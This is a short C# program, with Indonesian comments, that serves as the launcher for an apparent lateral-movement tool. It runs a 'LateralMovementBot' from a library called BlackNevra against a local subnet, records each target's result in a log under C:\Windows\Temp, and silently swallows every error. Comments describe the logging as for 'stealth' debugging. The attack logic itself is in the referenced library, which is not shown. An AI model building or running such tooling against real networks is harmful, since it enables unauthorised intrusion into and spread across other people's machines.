using System;
using System.IO;
using System.Threading.Tasks;
using BlackNevra;

namespace Latmov
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // Subnet default bisa disetel di sini, atau dikirim via args[0]
            string subnet = args.Length > 0 ? args[0] : "192.168.1";

            try
            {
                var results = await LateralMovementBot.RunBot(subnet);

                // Logging internal untuk debugging stealth (hapus jika tidak diperlukan)
                File.AppendAllLines("C:\\Windows\\Temp\\latmov.log", 
                    results.ConvertAll(r => $"{r.TargetIp}|{(r.Success ? "OK" : "FAIL")}|{r.Output ?? r.ErrorMessage}")
                );
            }
            catch
            {
                // Optional: abaikan semua error
            }
        }
    }
}
